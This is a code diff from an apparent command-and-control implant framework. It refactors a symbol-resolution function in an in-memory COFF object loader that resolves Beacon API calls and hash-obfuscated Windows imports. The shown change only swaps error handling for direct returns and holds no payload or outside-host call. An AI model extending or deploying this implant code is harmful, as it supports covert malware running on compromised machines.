@@ -52,16 +52,14 @@ namespace Objects {
 
     BOOL ProcessSymbol(char* sym_string, void** pointer) {
 
-        bool success    = true;
         char *function  = { };
-
         *pointer = nullptr;
 
         // __imp_Beacon
         if (HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
 
             function = sym_string + COFF_PREP_BEACON_SIZE;
-            success_(MapScan(implant_map, HashStringA(function, MbsLength(function)), pointer));
+            return MapScan(implant_map, HashStringA(function, MbsLength(function)), pointer);
         }
         // __imp_
         if (HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
@@ -78,23 +76,22 @@ namespace Objects {
                 auto fn_hash    = HashStringA(MbsToLower(buffer, split[1]), MbsLength(split[1]));
 
                 FreeSplit(split, count);
-                success_(C_PTR_HASHES(*pointer, lib_hash, fn_hash));
+                C_PTR_HASHES(*pointer, lib_hash, fn_hash);
+
+                return *pointer ? true : false;
             }
             else {
                 function = sym_string + COFF_PREP_SYMBOL_SIZE;
                 Trim(function, '@');
 
-                success_(MapScan(loader_map, HashStringA(function, MbsLength(function)), pointer));
+                return MapScan(loader_map, HashStringA(function, MbsLength(function)), pointer);
             }
         }
         // .refptr.__instance
         if (HashStringA(sym_string, MbsLength(sym_string)) == COFF_INSTANCE) {
             *pointer = (_hexane*) GLOBAL_OFFSET;
-            success_(true);
+            return *pointer ? true : false;
         }
-
-        defer:
-        return success;
     }
 
     BOOL ExecuteFunction(_executable* object, char* function, void* args, size_t size) {
